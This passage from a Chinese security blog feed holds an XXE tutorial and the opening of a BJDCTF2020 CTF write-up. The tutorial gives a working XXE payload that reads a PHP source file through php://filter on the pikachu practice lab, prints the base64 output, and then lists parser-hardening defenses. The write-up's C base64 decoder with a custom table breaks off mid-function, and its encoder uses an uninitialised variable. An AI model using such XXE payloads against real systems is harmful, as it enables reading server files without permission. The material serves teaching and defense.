<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>例子：</p>
<p>DTD 例子:</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY writer SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;&lt;!ENTITY copyright SYSTEM &quot;http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;dtd&#x2F;entities.dtd&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>XML 例子:</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>不同程序支持的协议不一样</p>
<p><img src="https://security.tencent.com/uploadimg_dir/201409/dbe8a63aa452a72a9e55c14b4766dc9b.png" alt></p>
<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p>XXE漏洞全称 XML External Entity Injection ，即XML外部实体注入，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起DOS攻击等危害。XXE漏洞触发的点往往是可以上传XML文件的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文件。</p>
<p><strong>漏洞利用</strong></p>
<p>靶场：pikachu xxe</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version &#x3D; &quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxe.php&quot;&gt;]&gt;&lt;x&gt;&amp;file;&lt;&#x2F;x&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>output:</p>
<pre class="line-numbers language-none"><code class="language-none">PD9waHAKLyoqCiAqIENyZWF0ZWQgYnkgcnVubmVyLmhhbgogKiBUaGVyZSBpcyBub3RoaW5nIG5ldyB1bmRlciB0aGUgc3VuCiAqLwoKCiRTRUxGX1BBR0UgPSBzdWJzdHIoJF9TRVJWRVJbJ1BIUF9TRUxGJ10sc3RycnBvcygkX1NFUlZFUlsnUEhQX1NFTEYnXSwnLycpKzEpOwoKaWYgKCRTRUxGX1BBR0UgPSAieHhlLnBocCIpewogICAgJEFDVElWRSA9IGFycmF5KCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCcnLCdhY3RpdmUgb3BlbicsJ2FjdGl2ZScsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycsJycpOwp9CgokUElLQV9ST09UX0RJUiA9ICAiLi4vLi4vIjsKaW5jbHVkZV9vbmNlICRQSUtBX1JPT1RfRElSLidoZWFkZXIucGhwJzsKCgo&#x2F;PgoKCgo8ZGl2IGNsYXNzPSJtYWluLWNvbnRlbnQiPgogICAgPGRpdiBjbGFzcz0ibWFpbi1jb250ZW50LWlubmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJicmVhZGNydW1icyBhY2Utc2F2ZS1zdGF0ZSIgaWQ9ImJyZWFkY3J1bWJzIj4KICAgICAgICAgICAgPHVsIGNsYXNzPSJicmVhZGNydW1iIj4KICAgICAgICAgICAgICAgIDxsaT4KICAgICAgICAgICAgICAgICAgICA8aSBjbGFzcz0iYWNlLWljb24gZmEgZmEtaG9tZSBob21lLWljb24iPjwvaT4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJ4ZWUucGhwIj48L2E+CiAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJhY3RpdmUiPuamgui&#x2F;sDwvbGk+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0icGFnZS1jb250ZW50Ij4KCiAgICAgICAgICAgIDxkaXYgY2xhc3M9InZ1bCBpbmZvIj4KICAgICAgICAgICAgICAgIFhYRSAtInhtbCBleHRlcm5hbCBlbnRpdHkgaW5qZWN0aW9uIjxicj4KICAgICAgICAgICAgICAgIOaXoiJ4bWzlpJbpg6jlrp7kvZPms6jlhaXmvI&#x2F;mtJ4i44CCPGJyPgogICAgICAgICAgICAgICAg5qaC5ous5LiA5LiL5bCx5pivIuaUu+WHu+iAhemAmui&#x2F;h+WQkeacjeWKoeWZqOazqOWFpeaMh+WumueahHhtbOWunuS9k+WGheWuuSzku47ogIzorqnmnI3liqHlmajmjInnhafmjIflrprnmoTphY3nva7ov5vooYzmiafooYws5a+86Ie06Zeu6aKYIjxicj4KICAgICAgICAgICAgICAgIOS5n+WwseaYr+ivtOacjeWKoeerr+aOpeaUtuWSjOino+aekOS6huadpeiHqueUqOaIt+err+eahHhtbOaVsOaNrizogIzlj4jmsqHmnInlgZrkuKXmoLznmoTlronlhajmjqfliLYs5LuO6ICM5a+86Ie0eG1s5aSW6YOo5a6e5L2T5rOo5YWl44CCPGJyPgogICAgICAgICAgICAgICAgPGJyPgogICAgICAgICAgICAgICAg5YW35L2T55qE5YWz5LqOeG1s5a6e5L2T55qE5LuL57uNLOe9kee7nOS4iuacieW+iOWkmizoh6rlt7HliqjmiYvlhYjmn6XkuIDkuIvjgIIKICAgICAgICAgICAgICAgIDxicj4KICAgICAgICAgICAgICAgIOeOsOWcqOW+iOWkmuivreiogOmHjOmdouWvueW6lOeahOino+aekHhtbOeahOWHveaVsOm7mOiupOaYr+emgeatouino+aekOWklumDqOWunuS9k+WGheWuueeahCzku47ogIzkuZ&#x2F;lsLHnm7TmjqXpgb&#x2F;lhY3kuobov5nkuKrmvI&#x2F;mtJ7jgII8YnI+CiAgICAgICAgICAgICAgICDku6VQSFDkuLrkvoss5ZyoUEhQ6YeM6Z2i6Kej5p6QeG1s55So55qE5pivbGlieG1sLOWFtuWcqOKJpTIuOS4w55qE54mI5pys5LitLOm7mOiupOaYr+emgeatouino+aekHhtbOWklumDqOWunuS9k+WGheWuueeahOOAgjxicj4KICAgICAgICAgICAgICAgIDxicj4KICAgICAgICAgICAgICAgIOacrOeroOaPkOS+m+eahOahiOS+i+S4rSzkuLrkuobmqKHmi5&#x2F;mvI&#x2F;mtJ4s6YCa6L+H5omL5Yqo5oyH5a6aTElCWE1MX05PRU5U6YCJ6aG55byA5ZCv5LqGeG1s5aSW6YOo5a6e5L2T6Kej5p6Q44CCCgoKICAgICAgICAgICAgPC9kaXY+CgogICAgICAgIDwvZGl2PjwhLS0gLy5wYWdlLWNvbnRlbnQgLS0+CiAgICA8L2Rpdj4KPC9kaXY+PCEtLSAvLm1haW4tY29udGVudCAtLT4KCgoKPD9waHAKaW5jbHVkZV9vbmNlICRQSUtBX1JPT1RfRElSIC4gJ2Zvb3Rlci5waHAnOwoKPz4K<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><p>1.使用开发语言提供的禁用外部实体的方法</p>
<p>PHP：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>JAVA:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">DocumentBuilderFactory</span> dbf <span class="token operator">=</span><span class="token class-name">DocumentBuilderFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dbf<span class="token punctuation">.</span><span class="token function">setExpandEntityReferences</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Python：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etreexmlData <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>xmlSource<span class="token punctuation">,</span>etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>2.过滤用户提交的XML数据</p>
<p>对变量：<code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>，或者，SYSTEM和PUBLIC进行过滤</p>
<p>3.检查所使用的底层xml解析库，默认禁止外部实体的解析<br>4.使用第三方应用代码及时升级补丁<br>5.同时增强对系统的监控，防止此问题被人利用</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<p><a href="https://thief.one/2017/06/20/1/">浅谈XXE漏洞攻击与防御</a></p>
<p><a href="https://security.tencent.com/index.php/blog/msg/69">未知攻焉知防——XXE漏洞攻防</a></p>
</blockquote>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>security</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 部分WriteUp</title>
    <url>/2020/03/14/bjdctf2020-bu-fen-writeup/</url>
    <content><![CDATA[<blockquote>
<p>复现平台：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
</blockquote>
<span id="more"></span>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="这是base？？"><a href="#这是base？？" class="headerlink" title="这是base？？"></a>这是base？？</h2><p>base编码原理的实现，百度了一下，找到个脚本，改一下table即可</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span>  </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span>  </span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>

<span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> base64_table <span class="token operator">=</span> <span class="token string">"JKLMNOxyUVzABCDEFGH789PQIabcdefghijklmWXYZ0123456RSTnopqrstuvw+/="</span><span class="token punctuation">;</span> <span class="token comment">/* base64编码表 */</span>

<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">num_strchr</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">char</span> c<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NULL</span> <span class="token operator">==</span> p<span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">return</span> p <span class="token operator">-</span> str<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">uint32_t</span> <span class="token function">base64_get_dest_len</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> src_len<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>src_len <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">uint32_t</span> <span class="token function">src_get_dest_len</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> base64_len<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> base64_len <span class="token operator">/</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src_str<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> src_len<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> dest_str<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> dest_len<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token class-name">uint32_t</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> len<span class="token punctuation">;</span>

	len <span class="token operator">=</span> <span class="token function">base64_get_dest_len</span><span class="token punctuation">(</span>src_len<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>dest_len <span class="token operator">&lt;</span> len<span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span><span class="token comment">/* 空间不足 */</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> src_len <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span>src_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* 取第一字符前6bit */</span>
		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>src_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>src_str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0f</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* 第一字符的后2bit与第二字符的前4位进行合并 */</span>
		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>src_str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3c</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>src_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x03</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* 将第二字符的后4bit与第三字符的前2bit组合并 */</span>
		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span>src_str<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">/* 取第三字符的后6bit */</span>
		src_str <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token comment">/* 非3的整数倍补“=” */</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>src_len <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span>src_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>src_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>src_str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0f</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'='</span><span class="token punctuation">;</span>
		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'='</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>src_len <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span>src_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>src_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>src_str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0f</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> base64_table<span class="token punctuation">[</span><span class="token punctuation">(</span>src_str<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3c</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> <span class="token string">'='</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token operator">*</span>dest_str <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> src_str<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> src_len<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> dest_str<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> dest_len<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token class-name">uint32_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>dest_len <span class="token operator">&lt;</span> <span class="token function">src_get_dest_len</span><span class="token punctuation">(</span>src_len<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> <span class="token punctuation">(</span>src_str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> src_len<span class="token punctuation">)</span><span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token comment">/* 四个码译成三个字符 */</span>
		buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">num_strchr</span><span class="token punctuation">(</span>base64_table<span class="token punctuation">,</span> src_str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">num_strchr</span><span class="token punctuation">(</span>base64_table<span class="token punctuation">,</span> src_str<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xfc</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x03</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>src_str<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">num_strchr</span><span class="token punctuation">(</span>base64_table<span class="token punctuation">,</span> src_str<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf0</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>src_str<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">num_strchr</span><span class="token punctuation">(</span>base64_table<span class="token punctuation">,</span> src_str<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token operator">*</span>dest_str<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xc0</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>buf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x3f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token operator">*</span>dest_str <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">char</span><span class="token operator">*</span> buf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token class-name">uint32_t</span> dest_len<span class="token punctuation">,</span> src_len<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"decode"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
